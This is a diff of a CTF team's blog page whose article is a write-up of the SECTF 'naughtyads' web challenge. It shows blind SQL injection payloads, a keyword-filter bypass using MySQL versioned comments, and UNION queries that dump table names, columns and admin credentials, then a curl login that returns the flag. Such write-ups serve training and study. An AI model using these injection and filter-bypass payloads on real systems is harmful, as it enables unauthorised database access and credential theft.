@@ -1,19 +1,19 @@
 <!DOCTYPE html>
-<html lang=en>
-<head>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-transform" />
-  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <meta name="format-detection" content="telephone=no,email=no,adress=no">
   <!-- Color theme for statusbar -->
-  <meta name="theme-color" content="#000000" />
+  <meta name="theme-color" content="#000000">
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
-  <meta http-equiv="window-target" content="_top" />
+  <meta http-equiv="window-target" content="_top">
   
   <title>[Web] SECTF - naughtyads | TeamRocketIST - Portuguese CTF Team</title>
   <meta name="description" content="Naughty ads - Web (200 + 0)Can you put agent Gill in the naughty ad section? His phone number is “555-31338”Solves: 122Service: http://naughtyads.alieni.se/Author: avlidienbrunn  Checking in robots.tx">
@@ -48,7 +48,7 @@
 
   <link rel="stylesheet" href="/css/style.css">
 </head>
-
+</html>
 
 <body class="main-center">
   <section class="mainside">
@@ -69,7 +69,7 @@
 
     <form class="search-form sidebar-form">
         <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <input type="text" class="search-form-input form-control" placeholder="Search">
             <span class="input-group-btn">
                 <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
             </span>
@@ -79,7 +79,7 @@
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech="">
             <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
             <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
         </div>
@@ -166,11 +166,11 @@
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="fa fa-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle="tooltip" data-placement="top"><i class="fa fa-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="fa fa-rss"></i></a></li>
         
     </ul>
     
@@ -335,7 +335,7 @@
   
   <section class="main">
   <div class="content">
-  <article id="post-Web-SECTF-naughtyads" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Web-SECTF-naughtyads" class="article article-type-post" itemscope="" itemprop="blogPost">
     
     <header class="article-header">
       
@@ -374,7 +374,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 320 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 323 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 2 (min)</span>
@@ -384,35 +384,35 @@
     </header>
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote><br><br>Naughty ads - Web (200 + 0)<br><br>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”<br><br>Solves: 122<br><br>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="external">http://naughtyads.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>
+        <blockquote><br><br>Naughty ads - Web (200 + 0)<br><br>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”<br><br>Solves: 122<br><br>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="noopener">http://naughtyads.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>
 
 <p>Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials.</p>
 <h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>Another Sql injection after some searching I found a GET param vulnerable to blind SQLi</p>
 <p>Successful query that returns content :</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/55vYxqN.png" alt=""></p>
 <p>Unsuccessful query that returns nothing :</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/exBhKMF.png" alt=""></p>
 <hr>
 <h3 id="Bypassing-filters"><a href="#Bypassing-filters" class="headerlink" title="Bypassing filters"></a>Bypassing filters</h3><p>Now there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// bypasses or filter</div><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' <span class="comment">/*!50000or*/</span> 1 AND 'A'='A</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// bypasses or filter</span><br><span class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' <span class="comment">/*!50000or*/</span> 1 AND 'A'='A</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/5iPiplZ.png" alt=""></p>
 <h3 id="Performing-Union-Injections"><a href="#Performing-Union-Injections" class="headerlink" title="Performing Union Injections"></a>Performing Union Injections</h3><p>Getting Table names:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(table_name) <span class="comment">/*!50000from*/</span> information_schema.tables <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(table_name) <span class="comment">/*!50000from*/</span> information_schema.tables <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/rL6GHpT.png" alt=""></p>
 <p>Getting Columns names:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(column_name) <span class="comment">/*!50000from*/</span> information_schema.columns <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(column_name) <span class="comment">/*!50000from*/</span> information_schema.columns <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/LHkGiYk.png" alt=""></p>
 <p>Getting the Username and password</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(name, " ", password) <span class="comment">/*!50000from*/</span> login <span class="comment">/*!50000where*/</span> '1'='1</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(name, " ", password) <span class="comment">/*!50000from*/</span> login <span class="comment">/*!50000where*/</span> '1'='1</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.imgur.com/i72v18w.png" alt=""></p>
 <p>After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret</p>
 <hr>
 <h3 id="Admin-Login"><a href="#Admin-Login" class="headerlink" title="Admin Login"></a>Admin Login</h3><p>We have a simple form with a image upload well if we remember the challenge description:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</span><br></pre></td></tr></table></figure>
 <p>So lets put the number and submit the form:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://naughtyads.alieni.se/admin/'</span> --user webmasterofdoom3755:secret --data <span class="string">'phone=555-31338'</span></div><div class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">'http://naughtyads.alieni.se/admin/'</span> --user webmasterofdoom3755:secret --data <span class="string">'phone=555-31338'</span></span><br><span class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</span><br></pre></td></tr></table></figure>
 <p>And we got the flag!!!</p>
 
       
@@ -479,7 +479,7 @@
   
 </div>
 
-  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <nav class="bar bar-footer clearfix" data-stick-bottom="">
   
   <ul class="pager pull-left">
     
